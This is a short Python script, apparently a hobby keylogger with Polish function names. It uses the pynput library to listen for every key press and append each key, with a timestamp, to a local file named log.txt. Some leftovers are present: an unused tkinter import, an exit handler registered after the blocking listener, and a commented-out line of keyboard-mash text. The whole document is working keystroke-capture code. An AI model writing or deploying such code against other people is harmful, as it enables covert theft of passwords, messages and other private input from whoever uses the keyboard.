

import tkinter as tk
import pynput
import datetime
from pynput.keyboard import Key, Listener
import atexit

count = 0
keys = []


with open("log.txt", "a") as f:
    t = '\n\n********************************************* Run on: ' + str(datetime.datetime.now()) + '   <---Tak!\n\n'
    f.write(t)


def naciskasz(key):
    global keys, count

    keys.append(key)
    count += 1
    zapis(keys)
    keys = []



def zapis(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k_s = str(key).replace("'", "")
            k = str(datetime.datetime.now()) + ' ---> ' + k_s + '\n'
            f.write(k)


with Listener(on_press=naciskasz) as listener:
    listener.join()


def zakonczenie():
    with open("log.txt", "a") as f:
        f.write("cos")


atexit.register(zakonczenie)

#print('to juno!!!fgfdgdfgdsfgdsfgdsfgdsfgdsfgsdfgdsgs')